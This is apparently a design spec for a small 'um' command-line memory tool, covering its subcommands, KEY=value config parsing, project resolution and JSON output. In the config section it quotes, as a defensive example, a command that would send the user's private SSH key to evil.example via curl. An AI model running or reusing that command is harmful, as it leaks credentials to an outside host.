# `um` CLI — v0.4 spec

**Version:** v0.4.0-alpha (first release)
**Canonical name:** `um` (per Task 0.6 — no default-installed conflicts on Git Bash / Ubuntu / macOS)
**Invocation:** `um <subcommand> [flags] [args]`

---

## Contents

- [Install](#install)
- [Subcommands](#subcommands)
- [Config](#config)
- [Project resolution](#project-resolution)
- [JSON output contracts](#json-output-contracts)
- [Extension points](#extension-points)
- [Versioning](#versioning)

---

## Install

Install is handled by the Phase D installer (`installer/install-cli.sh`). After installation:

- `um` is placed on `$PATH` (typically `~/.local/bin/um`).
- A config block is appended to `~/.bashrc` / `~/.zshrc` by the installer; this block sets
  `UM_SERVER_URL` and optionally `UM_OPENAI_API_KEY` as last-resort defaults.
- Per-repo config is read from `.um/config` (KEY=value) at runtime; see [Config](#config).

---

## Subcommands

Seven subcommands ship in v0.4 (A.9 `um validate` was dropped per Task 0.5b):

| Command | Purpose | Server endpoint |
|---|---|---|
| `um search <query>` | Search memories | `/api/search` |
| `um state <project>` | Read project state.md | `/api/state/{project}` |
| `um recent <project>` | Recent memories | `/api/recent/{project}` |
| `um list` | List all memories | `/api/list` |
| `um capture` | Append raw capture (fs-direct, no server) | — |
| `um tail [N]` | Batch tail of raw captures | — |
| `um forget <id>` | Delegate to `bin/um-forget` | — |
| `um supersede <old> <new>` | Delegate to `bin/um-supersede` | — |

---

### `um search <query>`

Search the memory store for entries matching `<query>`.

**Flags:**

| Flag | Default | Description |
|---|---|---|
| `--limit N` | `5` | Maximum results to return |
| `--full` | off | Include full `body` field instead of snippet |
| `--server URL` | config/env | Override `UM_SERVER_URL` |
| `--project <p>` | resolved | Override project (see [Project resolution](#project-resolution)) |
| `--json` | on | Always-on; flag is a no-op (all output is JSONL) |

**Output:** JSONL — one JSON object per match, written to stdout.

```json
{"id": "adr-postgres", "title": "Postgres vs Mongo", "score": 0.92, "snippet": "Postgres vs Mongo — chose Postgres for ACID guarantees and..."}
```

With `--full`:

```json
{"id": "adr-postgres", "title": "Postgres vs Mongo", "score": 0.92, "snippet": "Postgres vs Mongo — chose Postgres for...", "body": "<full content>"}
```

**Exit codes:**

| Code | Meaning |
|---|---|
| `0` | Success (zero or more results) |
| `2` | Config / project resolution error |
| `3` | Server unreachable or HTTP error |

---

### `um state <project>`

Read the `state.md` file for a project from the server.

**Flags:**

| Flag | Default | Description |
|---|---|---|
| `--server URL` | config/env | Override `UM_SERVER_URL` |

**Argument:** `<project>` is required. If omitted, project resolution applies (see
[Project resolution](#project-resolution)).

**Output:** Single JSON object to stdout.

```json
{"ok": true, "project": "universal-memory", "state": {"frontmatter": {"valid_from": "2026-04-10"}, "body": "..."}, "valid_from": "2026-04-10"}
```

If no `state.md` exists for the project:

```json
{"ok": true, "project": "universal-memory", "state": null, "valid_from": null}
```

**Exit codes:** same table as `um search`.

---

### `um recent <project>`

List recent memory entries for a project.

**Flags:**

| Flag | Default | Description |
|---|---|---|
| `--limit N` | `10` | Maximum results |
| `--full` | off | Include full `body` field |
| `--server URL` | config/env | Override `UM_SERVER_URL` |

**Argument:** `<project>` — if omitted, project resolution applies.

**Output:** JSONL, same compact shape as `um search` (without `score`):

```json
{"id": "2026-04-10-retro", "title": "Sprint retro 2026-04-10", "snippet": "Sprint retro — velocity 42, blockers: none..."}
```

**Exit codes:** same table as `um search`.

---

### `um list`

List all memory entries visible to the server (all projects).

**Flags:**

| Flag | Default | Description |
|---|---|---|
| `--limit N` | `50` | Maximum results |
| `--full` | off | Include full `body` field |
| `--server URL` | config/env | Override `UM_SERVER_URL` |

**Output:** JSONL, one object per entry:

```json
{"id": "adr-postgres", "title": "Postgres vs Mongo", "snippet": "Postgres vs Mongo — chose Postgres for..."}
```

**Exit codes:** same table as `um search`.

---

### `um capture`

Append a raw capture entry directly to the filesystem (no server round-trip). Reads from
stdin until EOF, then writes a timestamped file under the captures directory.

Implemented by `bin/um-capture.sh` (created in Phase A.1).

**Flags:**

| Flag | Default | Description |
|---|---|---|
| `--project <p>` | resolved | Override project |
| `--title <t>` | `""` | Optional title for the capture |

**Usage:**

```sh
echo "decided to use Postgres" | um capture --project myapp --title "ADR: Postgres"
# or interactively:
um capture --project myapp
<type content>
^D
```

**Output:** On success, prints the path of the written file to stdout.

**Exit codes:**

| Code | Meaning |
|---|---|
| `0` | Success |
| `2` | Config / project resolution error |
| `1` | Write failure |

---

### `um tail [N]`

Print the last `N` raw capture entries for the resolved project (default `N=10`). Reads
directly from the captures directory; no server required.

Implemented by `bin/um-tail.sh` (created in Phase A.8).

**Flags:**

| Flag | Default | Description |
|---|---|---|
| `--project <p>` | resolved | Override project |

**Argument:** `N` — optional integer, number of entries to show (default 10).

**Output:** JSONL, one object per capture file (newest first):

```json
{"file": "2026-04-21T14-32-00Z.md", "title": "ADR: Postgres", "body": "decided to use Postgres"}
```

**Exit codes:**

| Code | Meaning |
|---|---|
| `0` | Success |
| `2` | Config / project resolution error |

---

### `um forget <id>`

Mark a memory entry as forgotten. Delegates to the existing `bin/um-forget` script.

**Argument:** `<id>` — the filename stem of the memory to forget (required).

**Output:** Confirmation line to stdout on success; error to stderr on failure.

**Exit codes:** propagated from `bin/um-forget`.

---

### `um supersede <old> <new>`

Mark memory entry `<old>` as superseded by `<new>`. Delegates to the existing
`bin/um-supersede` script.

**Arguments:** `<old>` and `<new>` — filename stems (both required).

**Output:** Confirmation line to stdout on success; error to stderr on failure.

**Exit codes:** propagated from `bin/um-supersede`.

---

## Config

### File format (locked: KEY=value)

Config files use a plain `KEY=value` format — one assignment per line. This format was
chosen to:

1. Match the `_UM_MARKER_START` block already emitted by `install.sh` / `install-cli.sh`.
2. Require zero third-party dependencies (shell-native parsing).
3. Be readable and writable by any tool that can process text lines.

**Example `.um/config`:**

```
UM_SERVER_URL=http://localhost:6335
UM_PROJECT=my-app
UM_OPENAI_API_KEY=sk-...
```

Supported keys (case-sensitive, uppercase):

| Key | Description |
|---|---|
| `UM_SERVER_URL` | Base URL of the `um` server |
| `UM_PROJECT` | Default project name |
| `UM_OPENAI_API_KEY` | OpenAI API key (used by server-side summarization) |

Future keys follow the same `UM_*` prefix convention.

---

### Parsing (shell-injection safe)

Config files are parsed **line-by-line** using a regex capture — they are **never**
`source`d or `.`-evaluated. This eliminates shell-injection risk.

Reference regex (POSIX ERE):

```
^[[:space:]]*([A-Z_][A-Z0-9_]*)=[[:space:]]*(.*)[[:space:]]*$
```

After capture:

1. **CRLF stripped globally:** `value="${value//$'\r'/}"` — applies even inside quoted values.
2. **Surrounding quotes stripped:** if the captured value is wrapped in `"..."` or `'...'`,
   the outer pair is removed (no re-expansion).
3. **Values are literal bytes:** no `$(...)`, no backtick substitution, no semicolon
   execution — the value is treated as an opaque string.

**Invalid lines** (blank lines, comment lines starting with `#`, lines that do not match
the regex) are **silently skipped with a one-line `stderr` warning**:

```
um: config warning: skipping unrecognized line in /path/to/.um/config: <line>
```

This means a config file with comments is technically invalid but safe — each comment line
produces a warning and is ignored.

---

### `_um_load_config` behavioral contract

The function `_um_load_config` lives in
`plugins/claude-code/universal-memory/hooks/lib/config.sh` (created in Phase A.2).
This section specifies **behavior**; the implementation reference lives with the code.

**Behavior contract:**

- **Precedence:** env vars already set in the environment are never overwritten
  (`${!key+x}` test — skip if pre-set).
- **Multi-file load order:** repo-local `.um/config` is loaded **before** `~/.um/config`;
  repo-local values therefore win over user-global values (but both lose to env vars).
- **Safety:** values from the file are assigned to shell variables as literal strings;
  no evaluation occurs.
- **CRLF:** stripped globally via `${value//$'\r'/}`.
- **Invalid lines:** log-and-skip with one-line `stderr` warning (see above).
- **Quoting:** surrounding `"..."` or `'...'` are stripped post-regex-capture with no
  re-expansion.

---

### Why not `source` / `.`

Sourcing a config file executes it as shell code. An attacker-controlled or accidentally
corrupted config entry such as:

```
UM_PROJECT=$(curl -s evil.example/exfil?data=$(cat ~/.ssh/id_rsa))
```

would execute silently. Line-by-line regex parsing gives us typed string assignment with no
execution surface.

---

### Why not TOML / INI

TOML and INI parsers are not available in a bare POSIX shell environment without installing
additional dependencies. The `KEY=value` format is parseable with only `read`, `sed`, or
POSIX parameter expansion — matching the zero-dependency goal of the `um` installer.

---

### Config resolution order

Resolution proceeds highest-to-lowest priority; the first source that provides a value wins:

1. **CLI flags** — `--server <URL>`, `--api-key <KEY>`, `--project <p>`
2. **Environment variables** — `$UM_SERVER_URL`, `$UM_OPENAI_API_KEY`, `$UM_PROJECT`
3. **Repo-local config** — `.um/config` (KEY=value) in the repo root
4. **User-global config** — `~/.um/config` (KEY=value)
5. **Installer-managed shell block** — exported vars in `~/.bashrc` / `~/.zshrc`
   (written by `install.sh` / `install-cli.sh` between `_UM_MARKER_START` / `_UM_MARKER_END`)
6. **Last-resort defaults:**
   - `UM_SERVER_URL` → `http://localhost:6335`
   - `UM_PROJECT` → git-repo-name fallback (see [Project resolution](#project-resolution)),
     then ERROR (exit 2)
   - `UM_OPENAI_API_KEY` → ERROR if the invoked subcommand requires it

---

## Project resolution

Project is resolved in the following order (highest priority first):

1. `--project <p>` CLI flag / positional argument
2. `UM_PROJECT` environment variable
3. Repo-local `.um/config` → `UM_PROJECT=...` entry
4. `git rev-parse --show-toplevel | xargs basename` — the git repo root's directory name
5. **ERROR (exit 2):**
   ```
   um: no project specified; use --project, set UM_PROJECT, add UM_PROJECT=... to .um/config, or run from inside a git repo
   ```

**Test requirement:** All subcommand tests (`um-*.test.sh`) MUST include a case that
exercises step 5 — no project flag, no `UM_PROJECT` env var, no `.um/config`, and no git
repo — and asserts exit code 2 with the exact error message above.

The subcommands that perform project resolution are: `um state`, `um recent`,
`um capture`, and `um tail`.

`um search` is vault-wide by default and does not perform project resolution. The server
supports an optional `filters.project` parameter via POST, but the CLI does not expose
this filter today.

`um list` is vault-wide by design (B.1.4b decision) and does not perform project
resolution. A positional project arg is accepted but ignored with a warning.

---

## JSON output contracts

All read subcommands write **JSONL** (one JSON object per line) to **stdout**. Errors are
written to **stderr**; exit codes convey status.

### Compact shape (search / recent / list)

```json
{"id": "string (filename stem)", "title": "string", "snippet": "string (title + first 240 chars of body + …)"}
```

`um search` adds a `score` field (float, 0–1):

```json
{"id": "string", "title": "string", "snippet": "string", "score": 0.92}
```

### Full shape (with `--full`)

All compact-shape objects gain a `body` field:

```json
{"id": "string", "title": "string", "snippet": "string", "score": 0.92, "body": "string (full content)"}
```

### `um state` shape

Single object (not JSONL):

```json
{"ok": true, "project": "string", "state": {"frontmatter": {}, "body": "string"}, "valid_from": "YYYY-MM-DD|null"}
```

No state.md:

```json
{"ok": true, "project": "string", "state": null, "valid_from": null}
```

### `um tail` shape

JSONL, one object per capture file (newest first):

```json
{"file": "string (filename)", "title": "string", "body": "string"}
```

### Design notes

- JSONL is chosen so consumers can pipe output through `jq` naturally:
  `um search "postgres" | jq '.snippet'`
- The compact `snippet` field mirrors the shape already produced by the B.1 summarizer
  (`id`, `title`, snippet of title + first 240 chars of body + `…`).
- The `score` field is omitted from `um recent` and `um list` responses because those
  endpoints do not rank by semantic similarity.

---

## Extension points

To add a new subcommand `um foo`:

1. Create `plugins/claude-code/universal-memory/bin/um-foo.sh`.
2. Create `plugins/claude-code/universal-memory/bin/um-foo.test.sh`; include the
   "no project, no env, no git → exit 2" case as a mandatory test.
3. Register in `bin/um`'s `case` dispatcher:
   ```sh
   foo) exec "$BIN_DIR/um-foo.sh" "$@" ;;
   ```
4. Add a row to the [Subcommands](#subcommands) table and a full section in this document.

Subcommands are shell scripts in a well-known directory — no plugin registry or
meta-framework needed.

---

## Versioning

`v0.4.0-alpha` is the first release of the `um` CLI. The following contracts are
**stable** as of this version and will be preserved in all future minor releases
(`v0.4.x`):

- Config file format (KEY=value)
- Config resolution order (6 levels)
- Project resolution order (5 steps + exact error message)
- JSON output shapes (compact, full, state, tail)
- Exit code semantics (0 / 1 / 2 / 3)
- Subcommand names and required flags

Breaking changes (rename, removal, incompatible shape changes) are only permitted in
major version increments (`v0.5+`) and must be preceded by a deprecation notice in the
release notes.
